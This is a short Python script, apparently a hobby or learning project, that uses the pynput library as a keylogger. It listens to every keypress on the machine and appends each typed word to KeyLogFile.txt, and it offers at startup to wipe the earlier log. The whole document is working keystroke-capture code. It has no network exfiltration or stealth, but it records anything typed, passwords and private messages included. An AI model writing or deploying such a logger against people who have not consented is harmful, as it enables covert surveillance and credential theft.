from pynput.keyboard import Listener


print("Would you like to wipe the file? (y/n):")
wipeAnswer = input().strip()  # Removes accidental spaces

if wipeAnswer.lower() == "y":  # Handles both "y" and "Y"
    with open("KeyLogFile.txt", "w") as f:  # 'with' ensures proper file closing
        f.write("")
    print("File wiped successfully!")
else:
    print("File was not wiped.")

# ✅ Ensure this write operation completes before starting the listener
with open("KeyLogFile.txt", "a") as f:
    f.write("\n ----New Entries---- \n")


# Variable to store the current word being typed
current_word = ""

# Function to log keys
def log_key(key):
    global current_word

    try:
        # Add character to the current word
        current_word += key.char
    except AttributeError:
        # If space or enter is pressed, write the word to the file
        if key == key.space or key == key.enter:
            with open("KeyLogFile.txt", "a") as file:
                file.write(current_word + "\n")  # Write word and move to a new line
            current_word = ""  # Reset the current word

        # Log backspace and other special keys
        #elif key == key.backspace:
         #   current_word = current_word[:-1]  # Remove the last character
          #  with open("KeyLogFile.txt", "a") as file:
           #     file.write("Key.backspace\n")  # Log backspace event

        # Log all other special keys (Shift, Ctrl, etc.)
        #else:
         #   with open("KeyLogFile.txt", "a") as file:
          #      file.write(f"{key}\n")

# Start key listener
with Listener(on_press=log_key) as listener:
    listener.join()



